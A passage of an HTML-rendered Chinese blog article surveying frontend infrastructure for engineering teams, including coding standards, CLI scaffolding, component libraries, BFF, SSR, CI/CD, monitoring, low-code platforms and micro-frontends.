title="前端基建意义与作用"></a>前端基建意义与作用</h2><ul><li>业务复用；</li><li>提升研发效率；</li><li>规范研发流程；</li><li>团队技术提升；</li><li>团队的技术影响力；</li><li>开源建设；<br><a name="ZDuKL"></a></li></ul><h1 id="三、前端基建如何推动落地？"><a href="#三、前端基建如何推动落地？" class="headerlink" title="三、前端基建如何推动落地？"></a>三、前端基建如何推动落地？</h1><p><a name="TPbJ5"></a></p><h2 id="技术基建简要流程"><a href="#技术基建简要流程" class="headerlink" title="技术基建简要流程"></a>技术基建简要流程</h2><p>要说 前端基建，最主要的难点莫过于如何去推动落地，其中不乏需要前端同学的付出，还需要领导的支持等等，下面我给大家罗列一下大致的步骤（因团队而异）</p><ol><li><strong>要合适的同学（资源）</strong><ul><li>挨个与前端同学商议，或者自己钦点某位同学等等；而且要有动力，切勿急于求成、半途而废，注重系统思维，也千万不要找不稳定的同学（切记切记切记）</li></ul></li><li><strong>要解决的问题（问题）</strong><ul><li>针对现有公司前端人员架构、技术架构以及业务架构做对应的方案，这个没有固定的套路，不同公司所面临的问题也不一致；</li></ul></li><li><strong>要解决问题方案计划书（方案）</strong><ul><li>到目前，咱们已经有人（前端同学），也有具体想要做的事了，那么接下来很重要的一步就是出解决方案找领导确认了；</li><li>其实就类似你有一个很好 idea，写了一份特别详细的商业计划书（BP）去找投资人拉投资是一个道理；</li><li>不过最后能不能打动你的投资人，这就取决于你的 BP 做的是否够吸引人了；</li></ul></li><li><strong>要具体执行的步骤（执行）</strong><ul><li>天底下没有一蹴而就的事，工作也是，所以对于一个现有的技术团队，咱们最好是从渐进式出发，在对现有业务不影响的前提下去做增量式的研发；<br><a name="Jwfjz"></a></li></ul></li></ol><h2 id="技术基建四大特性（切记）"><a href="#技术基建四大特性（切记）" class="headerlink" title="技术基建四大特性（切记）"></a>技术基建四大特性（切记）</h2><ul><li>技术的健全性</li><li>基建的稳定性</li><li>研发的效率性</li><li>业务的体验性</li></ul><p>到这里，我相信大家对前端基建已有初步的了解，可能会有同学已经想跃跃欲试了，但是前端基建到底有些什么呢？咱们一起往下看。<br><a name="E6zrL"></a></p><h1 id="四、前端基建都有什么？"><a href="#四、前端基建都有什么？" class="headerlink" title="四、前端基建都有什么？"></a>四、前端基建都有什么？</h1><p>前端基建 在每个公司甚者每个业务团队都会有差异，其中有 技术栈的差异，有编码的差异，有文档注释的差异 等等；<br />为了迎合主要的前端基建市场，结合我司以及大部分公司的基建所需，下面给大家介绍一些符合大众的常用基建部分（后续会持续更新）；<br />下面所有分类只会简单介绍，详细相关文章会在《<a href="https://juejin.cn/column/7139087916306792462">前端搞基建</a>》专栏后续发表（敬请期待…）；<br><a name="McB2d"></a></p><h2 id="1-前端规范（Standard）"><a href="#1-前端规范（Standard）" class="headerlink" title="1. 前端规范（Standard）"></a>1. 前端规范（Standard）</h2><p>正所谓：前端不规范，后面看着办 ~<br />我相信规范两个词，是所有同学的噩梦，怕他不规范，又怕他太规范，这可真是难为死这个规范了；<br /><strong>假设招聘现有三个候选人，你会选择哪个呢？</strong></p><ul><li>一名 <strong>“摆烂”</strong> 的程序员，写的代码能运行就行；</li><li>一名 <strong>“合格”</strong> 的程序员，写的代码能运行且无 BUG；</li><li>一名 <strong>“优秀”</strong> 的程序员，写的代码能运行无 BUG 且可读性、可维护性、可复用性都高；</li></ul><p>答案显而易见 ~<br /><strong>前端规范的意义：</strong></p><ul><li>降低开发的成本；</li><li>保证代码的一致性；</li><li>提升团队的整体效率；</li></ul><p><strong>前端规范有什么？</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103622-9e027779-344f-40f3-b7c6-ef32bc760582.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103622-9e027779-344f-40f3-b7c6-ef32bc760582.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="KQ0yz"></a></p><h2 id="2-前端文档（Document）"><a href="#2-前端文档（Document）" class="headerlink" title="2.前端文档（Document）"></a>2.前端文档（Document）</h2><p>其实在许许多多的小型公司，文档缺失是一项必不可少的问题；无论是 业务文档，还是 技术文档，还是 其它文档等等；<br /><strong>问题点：</strong></p><ul><li>有些公司招人进来上午安环境，下午直接开始撸需求代码；</li><li>有些公司的新人来公司一个月了竟然还不知道公司组织架构与业务划分；</li><li>有些公司老对新几乎无交集，全靠新人猜，一个需求做下来竟然不知道做的什么，只知道一直很忙；</li><li>有些公司在安排员工去开发另一个项目业务，竟然无从下手，不知所措；</li><li>……</li></ul><p>所以一个合格的公司文档是必不可少的，无论是 新人自治，还是老带新，业务转岗 等等；<br /><strong>前端文档的意义：</strong></p><ul><li>对新人友好，快速上手；</li><li>快速融入团队；</li><li>快速了解业务；</li></ul><p><strong>前端文档有什么？</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103692-08d1ea0a-9cb6-42fd-b628-6c8afcc5decb.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103692-08d1ea0a-9cb6-42fd-b628-6c8afcc5decb.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="rgekp"></a></p><h2 id="3-前端项目模板管理（Templates）"><a href="#3-前端项目模板管理（Templates）" class="headerlink" title="3. 前端项目模板管理（Templates）"></a>3. 前端项目模板管理（Templates）</h2><p>前端项目模板 说直白点就是，公司前端所对应的项目模板，以便快速创建项目；<br /><strong>场景一：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103909-f0324e60-6e8d-42e4-bfc0-2d4f640104e7.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103909-f0324e60-6e8d-42e4-bfc0-2d4f640104e7.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /><strong>前端项目模板主要意义：</strong></p><ul><li>快速创建项目，提升效率；</li><li>项目技术栈统一，方便管理；</li></ul><p><strong>前端项目模板有什么？</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103939-19ed21a0-0ad9-4652-a66e-1a5a47ba12f6.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103939-19ed21a0-0ad9-4652-a66e-1a5a47ba12f6.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="Jonae"></a></p><h2 id="4-前端脚手架（CLI）"><a href="#4-前端脚手架（CLI）" class="headerlink" title="4. 前端脚手架（CLI）"></a>4. 前端脚手架（CLI）</h2><p>前端脚手架 作为衡量一个成熟前端团队的标准，我相信很多前端 er 都对他已经很了解了；<br />但是目前市面上对脚手架的应用我相信 90%以上的团队仅限用于项目的快速创建，也就是使用现成的模板通过命令行快速搭建；<br />那么我们做这个脚手架是不是已经做到了 资源最大化 呢？<br />显然是没有的，如何去做我会在后续的文章中详解，大家敬请期待…<br /><strong>场景一：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104008-f0a7309d-38b3-4737-8ec3-5d47561a8d7c.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104008-f0a7309d-38b3-4737-8ec3-5d47561a8d7c.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /><strong>前端脚手架的意义：</strong></p><ul><li>快速搭建项目；</li><li>技术栈统一；</li><li>规范代码风格；</li><li>提升研发效率；</li><li>自动化；</li></ul><p><strong>前端脚手架有什么？</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104029-0ba5548c-0c68-4d58-ab7a-31619236f947.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104029-0ba5548c-0c68-4d58-ab7a-31619236f947.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="tVBKN"></a></p><h2 id="5-前端组件库（UI-Design）"><a href="#5-前端组件库（UI-Design）" class="headerlink" title="5. 前端组件库（UI Design）"></a>5. 前端组件库（UI Design）</h2><p>前端 UI 组件库：在开源社区有数不胜数的组件库，例如 Ant Design、Element UI、Vant UI 等等（实在太多啦），如果你觉得某个组件库很适合用在你的项目，那么你将少一半的开发时间，是不是摸鱼的时间又多了一半呢？<br />但是在一些中大型的公司，他们<strong>有他们的标准，不可能去使用一些现成的组件库；</strong><br />而且现成的一些开源组件库中的样式与交互达不到公司设计师的要求，所以这时候 为了统一业务的设计规范与样式，咱们可以马不停蹄地赶紧向领导去提一提搞一个组件库试试看咯！<br /><strong>场景重现：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104069-53f50ff9-f30f-4268-a334-6c5be44c5958.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104069-53f50ff9-f30f-4268-a334-6c5be44c5958.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /><strong>前端组件库的意义：</strong></p><ul><li>组件复用，提升研发效率；</li></ul><p><strong>前端组件库有什么？</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104279-b0e414ba-41cd-40a2-812f-312baa3e3ae9.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104279-b0e414ba-41cd-40a2-812f-312baa3e3ae9.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="KTnoC"></a></p><h2 id="6-前端响应式设计-or-自适应设计"><a href="#6-前端响应式设计-or-自适应设计" class="headerlink" title="6. 前端响应式设计 or 自适应设计"></a>6. 前端响应式设计 or 自适应设计</h2><p>响应式设计（Responseive Design） 指的是一个网站同一页面在不同屏幕尺寸下有不同的布局；一套代码能在所有终端能够正常展示，并不是为每个终端做一个特定版本，响应式是为解决移动互联网浏览器而诞生的。<br />自适应设计（Adaptive web design） 需要开发多套界面，通过检测视口以及设备，来判断当前访问的设备是 pc 端与移动端，从而返回不同的页面。<br /><strong>前端响应式设计：</strong></p><ul><li>一套代码提升研发效率；</li><li>不同分辨率设备灵活性强；</li><li>快速适配多端；</li></ul><p><strong>前端自适应设计：</strong></p><ul><li>设计与体验较好；</li><li>性能相对好；</li></ul><p>注意：<br />一个项目到底是用<strong>响应式设计</strong>，还是<strong>自适应设计</strong>，这个取决于项目的排版和设计的出入程度;<br />所以如果公司 PC 端和 H5 端的排版设计有较大的出入还是建议使用自适应设计；反之可以考虑响应式设计；<br />切入盲目选择；<br><a name="BxqK1"></a></p><h2 id="7-前端工具库（类-Hooks-x2F-Utils）"><a href="#7-前端工具库（类-Hooks-x2F-Utils）" class="headerlink" title="7. 前端工具库（类 Hooks &#x2F; Utils）"></a>7. 前端工具库（类 Hooks &#x2F; Utils）</h2><p>开源社区有数不胜数的 前端工具库，如 Day.js、axios、loadsh 等等，只是其中功能未必是你想要的；<br />而且许多 前端工具库边界考量范围大，这样就增加库的体积，明明我想要的只是一个简单的功能，可还是引入了整个库，这样就得不偿失；<br />可能有同学要说不是有 Tree Shaking 了吗，难道有了 按需引入 有了 Tree Shaking 我们就可以为所欲为了吗<br />一些中大型企业团队为了复用某些工具方法，提升研发效率，一般都会封装一个工具库，身为一个合格的基建搬砖工，前端工具库怎么能少得了呢？<br /><strong>前端工具库的意义：</strong></p><ul><li>工具方法复用，提升研发效率；</li><li>减少代码量；</li><li>团队技术提升；</li></ul><p><strong>前端工具库有什么？</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104353-bb2fc1f6-f90d-45c8-a43b-84f7669b4a25.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104353-bb2fc1f6-f90d-45c8-a43b-84f7669b4a25.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="jMjja"></a></p><h2 id="8-前端工具自动化（Tools）"><a href="#8-前端工具自动化（Tools）" class="headerlink" title="8. 前端工具自动化（Tools）"></a>8. 前端工具自动化（Tools）</h2><p>可能会有同学疑惑，这个前端工具和上面的前端工具不是一样的吗？</p><ul><li>前端工具自动化 主要针对的代码上层的格式、规范、测试方面的自动化工具；</li><li>前端工具库 主要针对的是代码层面的方法复用工具，所以其本质上有较为明显的区别；</li></ul><p><strong>场景重现：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104390-f3548c35-c620-4714-bddd-382c922b2fa7.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104390-f3548c35-c620-4714-bddd-382c922b2fa7.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /><strong>前端工具自动化的意义：</strong></p><ul><li>代码质量与风格的统一；</li><li>自动化编码流程；</li><li>提升效率；</li></ul><p><strong>前端工具自动化有什么？</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104522-0bf97777-e7cb-48c0-a396-4168c51df863.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104522-0bf97777-e7cb-48c0-a396-4168c51df863.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ijHEN"></a></p><h2 id="9-接口数据聚合（BFF）"><a href="#9-接口数据聚合（BFF）" class="headerlink" title="9. 接口数据聚合（BFF）"></a>9. 接口数据聚合（BFF）</h2><p>前端 BFF（Backends For Frontends） 即服务于前端的后端，也称聚合层或者中间层；<br />主要将后端复杂的微服务，聚合成对各种不同用户端（无线&#x2F;Web&#x2F;H5&#x2F;第三方等）友好和统一的 API；<br /><strong>场景重现：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104879-08251786-380c-412c-927f-2b56044a3fc5.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104879-08251786-380c-412c-927f-2b56044a3fc5.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /><strong>前端 BFF 的意义：</strong></p><ul><li>聚合 API，释放后端；</li><li>解耦合各个业务；</li><li>后端微服务引入；</li><li>易维护和修改 API；</li><li>更好的安全性；</li><li>更好的前端错误处理；</li></ul><p><strong>前端 BFF 的简单架构：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104856-218c8b92-661a-4429-afb4-cc433e88e198.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104856-218c8b92-661a-4429-afb4-cc433e88e198.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="i5C8n"></a></p><h2 id="10-前端-SSR-推进"><a href="#10-前端-SSR-推进" class="headerlink" title="10. 前端 SSR 推进"></a>10. 前端 SSR 推进</h2><p>服务器端渲染（Server-Side Rendering） 是指由服务端完成页面的 HTML 结构拼接的页面处理技术，发送到浏览器，然后为其绑定状态与事件，成为完全可交互页面的过程。<br />简单理解就是 html 是由服务端写出，可以动态改变页面内容，即所谓的动态页面。早年的 <a href="https://link.juejin.cn/?target=https://baike.baidu.com/item/php/9337">php</a>、<a href="https://link.juejin.cn/?target=https://baike.baidu.com/item/asp/128906">asp</a> 、<a href="https://link.juejin.cn/?target=https://baike.baidu.com/item/jsp/141543">jsp</a> 这些 Server Page 都是 SSR 的。<br />由于公司主要是 C 端用户，而且 SEO 要求极高，所以在前后端分离的情况下，SSR 就必不可少了 ~<br /><strong>场景一：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104999-c2d07874-ea37-4813-afce-dc789679d052.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104999-c2d07874-ea37-4813-afce-dc789679d052.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /><strong>前端 SSR 的目的：</strong></p><ul><li>前后端分离；</li><li>首屏加载速度快；</li><li>利于 SEO；<br><a name="BfMuC"></a></li></ul><h2 id="11-前端自动化构建部署（CI-x2F-CD）"><a href="#11-前端自动化构建部署（CI-x2F-CD）" class="headerlink" title="11. 前端自动化构建部署（CI&#x2F;CD）"></a>11. 前端自动化构建部署（CI&#x2F;CD）</h2><p>前端 CI&#x2F;CD 一般是指持续集成、部署、发布的一个过程；<br />用白话文讲，就是你每次 git commit 代码后，都会自动的为你部署项目至 测试环境、预生产环境、生产环境，不用你每次手动的去打包后 cv 到多个服务器和环境；<br /><strong>前端 CI&#x2F;CD 的意义：</strong></p><ul><li>提高开发人员生产力；</li><li>自动化发布；</li><li>提高代码质量；</li><li>更快地提供更新；</li></ul><p><strong>前端 CI&#x2F;CD 有什么？</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104802-556c26a8-3069-4925-b6db-b9c778169476.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157104802-556c26a8-3069-4925-b6db-b9c778169476.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="T8JYg"></a></p><h2 id="12-全链路前端监控-x2F-数据埋点系统"><a href="#12-全链路前端监控-x2F-数据埋点系统" class="headerlink" title="12. 全链路前端监控&#x2F;数据埋点系统"></a>12. 全链路前端监控&#x2F;数据埋点系统</h2><p>在大部分 To C 的项目中，我相信产品和运营都需要 统计线上产品在用户中的行为和使用情况，因为这样可以更快的去了解用户群里的使用情况，从而升级和迭代产品，使其更加贴近用户。<br /><strong>场景一：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105105-05d4158c-135d-43dc-b293-fa82fe4c55a8.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105105-05d4158c-135d-43dc-b293-fa82fe4c55a8.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /><strong>前端监控&#x2F;数据埋点的目的是：</strong></p><ul><li>实现精准的点对点营销；</li><li>可以做相关的分类统计；</li><li>为用户画像的构建提供数据支持；</li><li>指导产品研发以及优化用户体验；</li></ul><p><strong>前端监控&#x2F;数据埋点有哪些数据？</strong></p><ul><li>行为数据：时间、地点、人物、交互、交互的内容；</li><li>质量数据：浏览器加载情况、错误异常等；</li><li>环境数据：浏览器相关的元数据以及地理、运营商等；</li><li>运营数据：PV、UV、转化率、留存率（很直观的数据）；<br><a name="Sxzk0"></a></li></ul><h2 id="13-前端可视化平台"><a href="#13-前端可视化平台" class="headerlink" title="13. 前端可视化平台"></a>13. 前端可视化平台</h2><p>前端可视化 字面意义理解就是用肉眼可见的就称呼为前端可视化；即所见即所得；<br />笔者这里的理解 前端可视化 包括了 数据可视化、图形可视化、VR 全景可视化、中后台视觉可视化 等等；<br />其中每一个都需要花费大量的人力与精力，如果你想全方面的从入门到精通，可以看看<a href="https://juejin.cn/user/712139263189303">月影大佬</a>的可视化教程。<br />目前公司在基于前端基建这块，所做的可视化主要是基于大家的工作流程以及工作效率所做的一个 工程可视化平台；<br /><strong>场景一：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105264-c330d510-e0bb-4882-8e2c-17dab219e8cc.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105264-c330d510-e0bb-4882-8e2c-17dab219e8cc.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /><strong>前端工程可视化平台的目的：</strong></p><ul><li>方便项目管理；</li><li>高效提升工作效率；</li><li>一键搞定 CI&#x2F;CD 流；</li></ul><p><strong>前端工程可视化平台有什么？</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157106022-5dcbd2ae-bdeb-4334-ae93-72e2be9d51fc.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157106022-5dcbd2ae-bdeb-4334-ae93-72e2be9d51fc.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="yQgmu"></a></p><h2 id="14-前端性能优化"><a href="#14-前端性能优化" class="headerlink" title="14. 前端性能优化"></a>14. 前端性能优化</h2><p>性能优化这个词，我相信只要是程序员，多多少少都听过，而且都经历过；<br />如果你的项目是 ToB 项目，可能性能优化不会做到极致；<br />但是你的项目是 ToC 项目呢，那性能优化是不是就是一个你必须要考量的点呢？<br /><strong>场景重现：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105522-3c778742-f481-4770-84a8-f1b5e7d5ef4b.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105522-3c778742-f481-4770-84a8-f1b5e7d5ef4b.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />好家伙，用户直接崩溃，这是什么破网站，这么 🌶 🐔 ；<br /><strong>前端性能优化的意义：</strong></p><ul><li>页面加载的更快；</li><li>更好的用户体验；</li><li>降低服务器负荷；</li><li>提升编码的能力；</li></ul><p><strong>前端性能优化都有什么？</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105542-6d141ec1-7eaf-4ab8-8de3-52a6c6ee9ba9.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105542-6d141ec1-7eaf-4ab8-8de3-52a6c6ee9ba9.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="MUaAD"></a></p><h2 id="15-前端低代码平台搭建（建设中）"><a href="#15-前端低代码平台搭建（建设中）" class="headerlink" title="15. 前端低代码平台搭建（建设中）"></a>15. 前端低代码平台搭建（建设中）</h2><p>维基百科定义：低代码开发平台（LCDP） 本身也是一种软件，它为开发者提供了一个创建应用软件的开发环境；与传统编写代码的 IDE 不同，低代码开发平台提供更易用的可视化 IDE。<br />简单来讲，低代码（Low Code）就是一种可视化搭建系统，从字面意思来讲，一是可视化；二是少写代码。<br />无代码（No Code） 同样从字面上来理解，一是可视化，二是不写代码。<br /><strong>场景一：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105642-c5437ded-0deb-4a53-a281-4bbf3a0fa599.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105642-c5437ded-0deb-4a53-a281-4bbf3a0fa599.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /><strong>前端低代码平台的意义：</strong></p><ul><li><strong>降低开发成本；</strong></li><li><strong>所见即所得；</strong></li><li><strong>一站式研发；</strong></li><li><strong>技术收敛；</strong></li><li><strong>专业门槛低；</strong></li><li><strong>对新人友好，上手快；</strong></li></ul><p>注意：<br />低代码平台一般较针对于一些业务使用率较大且多是 ToB 的平台，所以判断当前系统是否需要使用低代码平台，建议在有大量业务的支撑前提下，否则得不偿失；<br />用新技术，更多的不是因为先进，而是适合。<br><a name="A5dpY"></a></p><h2 id="16-微前端（Micro-App）"><a href="#16-微前端（Micro-App）" class="headerlink" title="16. 微前端（Micro App）"></a>16. 微前端（Micro App）</h2><p>微前端（Micro-Frontends） 并没有定义框架或 API，它其实是一个类似 微服务架构 的概念；将 微服务 的概念扩展到了前端世界；<br />说微服务可能有些前端同学会感觉陌生，以咱们前端的角度一句话概括就是： 将您的大型前端应用拆分为多个小型前端应用，这样每个小型前端应用都有自己的仓库，可以专注于单一的某个功能；<br />需要强调的是，尽管我们将前端应用拆分为多个项目，但它们最终还是会被集成到一个单页前端应用程序中；因此，通过使用微前端架构，您不会在用户体验上有任何损失，只会有过之而无不及；<br /><strong>场景一：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105710-811e06bd-d9a4-46d2-8b21-60123228e6e4.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105710-811e06bd-d9a4-46d2-8b21-60123228e6e4.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /><strong>为什么要用微前端：</strong></p><ul><li>技术上的灵活选择；</li><li>更快的且独立的部署；</li><li>团队代码的相互隔离；</li><li>并行开发和团队的自治；</li><li>项目的增量升级；</li></ul><p><strong>微前端的价值：</strong><br /><img 